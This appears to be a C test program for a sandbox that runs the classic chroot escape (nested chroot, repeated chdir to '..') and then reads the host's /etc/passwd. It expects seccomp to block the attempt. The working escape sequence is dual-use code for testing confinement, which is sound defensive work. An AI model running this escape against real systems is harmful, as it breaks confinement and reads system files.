/*
 * chroot_escape.c — Classic chroot escape via mkdir + nested chroot loop.
 * Should be blocked because chroot() is not in the seccomp allow-list
 * AND the sandbox uses pivot_root (so there is no kernel-level chroot jail
 * to escape from in the first place).
 * Expected result: SIGSYS from seccomp or ENOENT/EPERM → exit non-zero.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>

int main(void)
{
    /* Step 1: Open the current directory fd (before chroot) */
    int old_dir = open(".", O_RDONLY);
    if (old_dir < 0) {
        fprintf(stderr, "[escape] open(.): %s\n", strerror(errno));
        return 1;
    }

    /* Step 2: Create a temp directory and chroot into it */
    mkdir("/tmp/jailbreak", 0755);
    if (chroot("/tmp/jailbreak") != 0) {
        fprintf(stderr, "[escape] chroot: %s — blocked (expected)\n", strerror(errno));
        close(old_dir);
        return 1;
    }

    /* Step 3: Walk up past the root */
    for (int i = 0; i < 100; i++) {
        chdir("..");
    }

    /* Step 4: Chroot to current directory (now the real root) */
    if (chroot(".") != 0) {
        fprintf(stderr, "[escape] second chroot: %s\n", strerror(errno));
        close(old_dir);
        return 1;
    }

    /* Step 5: Try to read /etc/passwd from host */
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[escape] open /etc/passwd after chroot escape: %s\n", strerror(errno));
        close(old_dir);
        return 1;
    }

    char buf[128];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    close(old_dir);

    if (n > 0) {
        buf[n] = '\0';
        fprintf(stderr, "[escape] CHROOT ESCAPE SUCCEEDED:\n%s\n", buf);
        return 0;  /* escape succeeded — test will FAIL */
    }

    return 1;
}
